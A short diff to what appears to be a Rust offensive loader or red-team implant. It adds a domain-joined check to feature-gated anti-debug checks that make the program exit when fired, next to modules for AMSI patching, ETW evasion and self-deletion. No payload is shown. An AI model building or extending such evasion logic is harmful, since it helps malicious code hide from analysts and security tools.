@@ -5,7 +5,7 @@ mod benign;
 #[cfg(feature = "UtilitySelfDeletion")]
 mod utilities;
 
-#[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag"))]
+#[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag", feature = "CheckDomainJoined"))]
 mod checks;
 
 #[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple"))]
@@ -118,7 +118,7 @@ fn run_evasion_techniques() {
 fn main() {
 
     // Anti-debug checks - runs all enabled checks
-    #[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag"))]
+    #[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag", feature = "CheckDomainJoined"))]
     {
         if checks::checks::run_all_checks() {
             std::process::exit(1);
